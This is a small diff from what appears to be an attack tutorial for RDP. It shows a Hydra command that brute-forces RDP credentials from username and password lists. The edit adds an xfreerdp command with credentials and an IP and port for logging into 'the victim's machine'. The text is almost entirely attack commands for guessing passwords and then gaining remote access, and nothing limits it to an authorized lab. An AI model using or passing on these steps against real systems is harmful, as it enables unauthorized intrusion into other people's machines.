@@ -14,6 +14,6 @@
 
        hydra -L user.txt -P password.txt rdp://IP -s PORT
 
-4. use and RDP tools to login into the victim's machine in linux
+4. use and RDP tools to login into the victim's machine in linux Tools (xfreerdp)
 
-       xfreerdp
+       xfreerdp /U:username /P:password /v:192.168.43.25:4444
